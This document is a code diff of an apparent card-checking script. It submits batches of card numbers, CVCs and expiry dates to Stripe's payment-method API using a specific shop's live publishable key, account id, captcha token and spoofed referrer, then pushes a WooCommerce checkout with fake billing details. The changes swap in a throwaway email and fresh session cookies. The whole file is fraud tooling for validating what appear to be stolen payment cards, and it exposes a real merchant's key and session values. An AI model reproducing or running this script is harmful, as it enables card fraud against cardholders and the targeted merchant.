@@ -33,32 +33,32 @@ def process_cards(cards):
     'sec-fetch-site': 'same-site',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
     }
-        	data = f'type=card&billing_details[name]=Ali+Mazen&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=New+York&billing_details[address][postal_code]=10010&billing_details[address][state]=NY&billing_details[email]=bdahpxr%40hi2.in&billing_details[phone]=0994488358&card[number]={nn}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=ba8f5f95-bf9d-47e2-8b0f-656ca8590a7d79f216&sid=NA&payment_user_agent=stripe.js%2F50ba0a1035%3B+stripe-js-v3%2F50ba0a1035%3B+split-card-element&referrer=https%3A%2F%2Fal-nadha.com&time_on_page=263992&key=pk_live_51HzoJkDhTL3jxamujcfGoKiSXVXVRxWTOBMWPHoaiwvPtvYdUjAoAn5dxRtYID8nJ2eJNdyTB2OJ8SQB6SlTJsqG005wLErA2T&_stripe_account=acct_1HzoJkDhTL3jxamu&_stripe_version=2022-08-01&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQaL3jPgLg7NblKeDOk-SuL39N9H3Gi4VTgkv0PMXcKIezTuD5_5K7riB18xnJcAm5LpcxbrbQfZCUeMgTETPNiZDJBFDtcYb8occuG_mhyWNhCRVepCMPKTXVW0FbBSU71uGMmo6NarssmYEGcIiLJXa7xMN23Df8L26q4MPRN82nmmYuCGyuliM1BUv27S2XOkOGQRZpMF9whs-mISiOOsWc_wrcyWuChaQX7qfpRPJWl6K2b8pyybfzqq_drexg3ljaqarYhIrHnGubpad7mfoFgQ6W0xj5x5nCd0Zk5nTCmrgMrUKopYkyVjC0VPzKZdgdWTkza-Iqxq012NTDzuHUMQzUSFMIQ2eeCdzrJ4plqhOPYvNHoXaJZDmNLVndjWhOGLvDu8hN618DmuhATZD5GLzFuOJTXUN5ubRR53OXFQZBC_6aeqJk-nuYTzXXTUoW0PW-j2wMtb_GOlh7qgWPd8bgS_DvrF2A61Pt8M-Yp_uWmsYfAsqsuZHaaiy9gnHUwugHQTmzzh4XtG9ap8TlpPREy46LHHqx-Z56InzvYjrT5F6b_zDMlCLbARmVhXHYFCzVVblMLBZ50_HZDoEmoaxzUqPJA-Nf5TCxxgJq0Y6mjw1gX03bCSLe6Z3EDTWQnyQsVaioBsJvGWlo64_viU6_0AKTTsEIGLH9O8ze6zFJL9OwUDmEOUBpgG6ULty8YxeDAFWGQUBAsRMxo-ZdJKLDWUP33tM43JswAhfsh8sD1XVvCfxfv3fCGu20qNNvnSft51XxwpdQuxgU5zMHKOks-C9AOgcy39BPdep33XUJu9EFo6oOp2cM6KLLhw_rrwn6pLBnvy6yMJQAnXTpcDcjO6Du3vxPdBy04SdSx1BX0-AdDagtRH8-sOEkygnC7TIp2ytgrvgK1f5FVDwF0CGUI8qGN7cv78VJZ-mn91vjZzc5o3ZF6GUj-F677ieEfebLSFXBZTrLMAnpk8UBSx_GNuAhYp6nY5eXdJLSsrGMzcZzCxLjxk2pYKrOU27L9QNu5tknuTd3hGbBl2jFwRmcE4u1g2OGBfhGG-sqmduveRsddFP3r6HLqSBBndNfVdUqdFi66G8F8EffWzL1nXxN6xc1M93n5_NVmOMw4yukusUFqk14W-xQibIVByKfAKxtW82Aq4IzfG4ApR5xQnw2t-hI8kVcKdnBtFu6m2ev4e9WteyIUqlNS924-vxQYpBhMvd9o5KJTROCdmojiwWmzdc-fAdXz7NFlsXEC1stn1by9fzogWt65QtoW-4geFZK9OSHH7WSuHA47DNxBhVYjHunAxw5D--4dT-eNOYVpR_iZsp99eBYHVhHs21ih0uZEaFfCKC7g00sbXheckwsx52UXSWeUInBx7e9srCvZ_IzCacm1yWBsP5u9-7j6PcSbJJ4NwMK-z9nEkVaWHoAWKvT5eNDefQ5FWPmSOPvcsNu9-tDgh8UXebjipGzIpe2d0OZXmOwAaOnFVFVPT1_RfFHTTraqNilKiwnGcMSYB8dxFMa7d4XkDaJJftOKjNGDwTD_zL_LI_Vr3iPCc8SGlcdZXP3GhOgjHSrqmgqdzSZ8Rz5S1XIj7eIZJQ8TgnBLlP-rHTY-KEgsUl0QMwdYufuVyGLykOqFqXCFseltjrehkwHP3PHbbyuYza5o-OPiTeB6qUU5vvpon5E4lHObtR0aRen5Sd1UeK_8SbMI-GR2hTCfhb1v6xa2b8ICaB_2y1KcpmVWxTHKU_kOFVs8MEVK2II1eFoFM-lsaFN9UNYrE5OXkbKowi09GDjA3Ekx3S2kQdsOfAnrVu8XkHuK3Ug_z8Cdiei7YNFrQTQaPnxN7qpzcOdSTRYFsRpMrrKOE2BTTo4Mkvq7sjWdFn4JLi14iNg86wsnqr5z3ANoR3CdqjNMcjjfXwNTUzhgkT8Yc31XMb7xqidbakj09LWQeCreV4ojrIYz-K5-LetA4BvHJoSXuffwfze-cXggUJ5DUQVgIIUx_ae2RVYnPkYks4nMdO5fwyzfAES6OQpNbxD7SWPe86H1nAEpm8wUvtJ94CanfCWC91WeZDQRo8OMFZ9XqhGuTsZJJkzGYzvK9K96Y1hS4gL0jEyKOAhOi2HazKHTtwEmDtjK3XTzVVxYdnGDepFUtId_qD6DPhP6mpQejAMHzFOp5Xlt2az_gc_VCQmqgJfecaXEiY4mHoA49yvsM2wzIkGdJr7LvLyqfFqwpWeaduaNleHDOZljthKhzaGFyZF9pZM4DMYNvomtyqDFmYjkxNTUxonBkAA.uuyI2b2EsKFmK_uEHi8ckl1dwUxxrZwVfHdqToygwBM'
+        	data = f'type=card&billing_details[name]=Ali+Mazen&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=New+York&billing_details[address][postal_code]=10010&billing_details[address][state]=NY&billing_details[email]=pjbxxxy%40telegmail.com&billing_details[phone]=0994488358&card[number]={nn}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=ba8f5f95-bf9d-47e2-8b0f-656ca8590a7d79f216&sid=NA&payment_user_agent=stripe.js%2F50ba0a1035%3B+stripe-js-v3%2F50ba0a1035%3B+split-card-element&referrer=https%3A%2F%2Fal-nadha.com&time_on_page=263992&key=pk_live_51HzoJkDhTL3jxamujcfGoKiSXVXVRxWTOBMWPHoaiwvPtvYdUjAoAn5dxRtYID8nJ2eJNdyTB2OJ8SQB6SlTJsqG005wLErA2T&_stripe_account=acct_1HzoJkDhTL3jxamu&_stripe_version=2022-08-01&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQaL3jPgLg7NblKeDOk-SuL39N9H3Gi4VTgkv0PMXcKIezTuD5_5K7riB18xnJcAm5LpcxbrbQfZCUeMgTETPNiZDJBFDtcYb8occuG_mhyWNhCRVepCMPKTXVW0FbBSU71uGMmo6NarssmYEGcIiLJXa7xMN23Df8L26q4MPRN82nmmYuCGyuliM1BUv27S2XOkOGQRZpMF9whs-mISiOOsWc_wrcyWuChaQX7qfpRPJWl6K2b8pyybfzqq_drexg3ljaqarYhIrHnGubpad7mfoFgQ6W0xj5x5nCd0Zk5nTCmrgMrUKopYkyVjC0VPzKZdgdWTkza-Iqxq012NTDzuHUMQzUSFMIQ2eeCdzrJ4plqhOPYvNHoXaJZDmNLVndjWhOGLvDu8hN618DmuhATZD5GLzFuOJTXUN5ubRR53OXFQZBC_6aeqJk-nuYTzXXTUoW0PW-j2wMtb_GOlh7qgWPd8bgS_DvrF2A61Pt8M-Yp_uWmsYfAsqsuZHaaiy9gnHUwugHQTmzzh4XtG9ap8TlpPREy46LHHqx-Z56InzvYjrT5F6b_zDMlCLbARmVhXHYFCzVVblMLBZ50_HZDoEmoaxzUqPJA-Nf5TCxxgJq0Y6mjw1gX03bCSLe6Z3EDTWQnyQsVaioBsJvGWlo64_viU6_0AKTTsEIGLH9O8ze6zFJL9OwUDmEOUBpgG6ULty8YxeDAFWGQUBAsRMxo-ZdJKLDWUP33tM43JswAhfsh8sD1XVvCfxfv3fCGu20qNNvnSft51XxwpdQuxgU5zMHKOks-C9AOgcy39BPdep33XUJu9EFo6oOp2cM6KLLhw_rrwn6pLBnvy6yMJQAnXTpcDcjO6Du3vxPdBy04SdSx1BX0-AdDagtRH8-sOEkygnC7TIp2ytgrvgK1f5FVDwF0CGUI8qGN7cv78VJZ-mn91vjZzc5o3ZF6GUj-F677ieEfebLSFXBZTrLMAnpk8UBSx_GNuAhYp6nY5eXdJLSsrGMzcZzCxLjxk2pYKrOU27L9QNu5tknuTd3hGbBl2jFwRmcE4u1g2OGBfhGG-sqmduveRsddFP3r6HLqSBBndNfVdUqdFi66G8F8EffWzL1nXxN6xc1M93n5_NVmOMw4yukusUFqk14W-xQibIVByKfAKxtW82Aq4IzfG4ApR5xQnw2t-hI8kVcKdnBtFu6m2ev4e9WteyIUqlNS924-vxQYpBhMvd9o5KJTROCdmojiwWmzdc-fAdXz7NFlsXEC1stn1by9fzogWt65QtoW-4geFZK9OSHH7WSuHA47DNxBhVYjHunAxw5D--4dT-eNOYVpR_iZsp99eBYHVhHs21ih0uZEaFfCKC7g00sbXheckwsx52UXSWeUInBx7e9srCvZ_IzCacm1yWBsP5u9-7j6PcSbJJ4NwMK-z9nEkVaWHoAWKvT5eNDefQ5FWPmSOPvcsNu9-tDgh8UXebjipGzIpe2d0OZXmOwAaOnFVFVPT1_RfFHTTraqNilKiwnGcMSYB8dxFMa7d4XkDaJJftOKjNGDwTD_zL_LI_Vr3iPCc8SGlcdZXP3GhOgjHSrqmgqdzSZ8Rz5S1XIj7eIZJQ8TgnBLlP-rHTY-KEgsUl0QMwdYufuVyGLykOqFqXCFseltjrehkwHP3PHbbyuYza5o-OPiTeB6qUU5vvpon5E4lHObtR0aRen5Sd1UeK_8SbMI-GR2hTCfhb1v6xa2b8ICaB_2y1KcpmVWxTHKU_kOFVs8MEVK2II1eFoFM-lsaFN9UNYrE5OXkbKowi09GDjA3Ekx3S2kQdsOfAnrVu8XkHuK3Ug_z8Cdiei7YNFrQTQaPnxN7qpzcOdSTRYFsRpMrrKOE2BTTo4Mkvq7sjWdFn4JLi14iNg86wsnqr5z3ANoR3CdqjNMcjjfXwNTUzhgkT8Yc31XMb7xqidbakj09LWQeCreV4ojrIYz-K5-LetA4BvHJoSXuffwfze-cXggUJ5DUQVgIIUx_ae2RVYnPkYks4nMdO5fwyzfAES6OQpNbxD7SWPe86H1nAEpm8wUvtJ94CanfCWC91WeZDQRo8OMFZ9XqhGuTsZJJkzGYzvK9K96Y1hS4gL0jEyKOAhOi2HazKHTtwEmDtjK3XTzVVxYdnGDepFUtId_qD6DPhP6mpQejAMHzFOp5Xlt2az_gc_VCQmqgJfecaXEiY4mHoA49yvsM2wzIkGdJr7LvLyqfFqwpWeaduaNleHDOZljthKhzaGFyZF9pZM4DMYNvomtyqDFmYjkxNTUxonBkAA.uuyI2b2EsKFmK_uEHi8ckl1dwUxxrZwVfHdqToygwBM'
         	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
         	#print(response.json())
         	pm = response.json()["id"]
         	
         	
         	cookies = {
-        	    'wcaiocc_user_currency_session': 'EUR',
-    'PHPSESSID': 'dncar1dvc30p83c4p6n9fnev2h',
-    '_fbp': 'fb.1.1718466730030.634617056251551572',
-    'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-06-15%2015%3A52%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Fal-nadha.com%2Fcart%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fal-nadha.com%2Fshop%2Funits%2Funits%2F',
-    'sbjs_first_add': 'fd%3D2024-06-15%2015%3A52%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Fal-nadha.com%2Fcart%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fal-nadha.com%2Fshop%2Funits%2Funits%2F',
-    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
-    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
+        	    '_fbp': 'fb.1.1718466730030.634617056251551572',
     '_gid': 'GA1.2.1006701108.1718466733',
-    'woocommerce_recently_viewed': '537',
     'wp_woocommerce_session_8181e73ab86fda8b24141304097755c5': 't_341ae88de80e73b971df3960b1c7d7%7C%7C1718639570%7C%7C1718635970%7C%7Ce9de48c1a588dd7dd6886188936ab047',
     '_ga': 'GA1.2.1890779885.1718466731',
     '_ga_701NGE5REB': 'GS1.1.1718466731.1.1.1718467176.0.0.0',
-    'sbjs_udata': 'vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
+    'mailpoet_subscriber': '%7B%22subscriber_id%22%3A43814%7D',
+    'wcaiocc_user_currency_session': 'EUR',
+    'PHPSESSID': 'ej32gve38lmvp0f5o737otefea',
+    'sbjs_migrations': '1418474375998%3D1',
+    'sbjs_current_add': 'fd%3D2024-06-15%2017%3A19%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fal-nadha.com%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fal-nadha.com%2Fshop%2Funits%2Funits%2F',
+    'sbjs_first_add': 'fd%3D2024-06-15%2017%3A19%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fal-nadha.com%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fal-nadha.com%2Fshop%2Funits%2Funits%2F',
+    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
+    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
+    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
     'woocommerce_items_in_cart': '1',
     'woocommerce_cart_hash': '548c6e177e54b8a870fb6eb16d85f8c5',
-    'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fal-nadha.com%2Fcheckout%2F',
-    'mailpoet_page_view': '%7B%22timestamp%22%3A1718470048%7D',
-
+    'woocommerce_recently_viewed': '537',
+    'mailpoet_page_view': '%7B%22timestamp%22%3A1718472210%7D',
+    'sbjs_session': 'pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fal-nadha.com%2Fcheckout%2F',
 
 
 }
@@ -95,7 +95,7 @@ def process_cards(cards):
     'billing_city': 'New York',
     'billing_state': 'NY',
     'billing_phone': '0994488358',
-    'billing_email': 'bdahpxr@hi2.in',
+    'billing_email': 'pjbxxxy@telegmail.com',
     'createaccount': '1',
     'order_comments': '',
     'wc_order_attribution_source_type': 'typein',
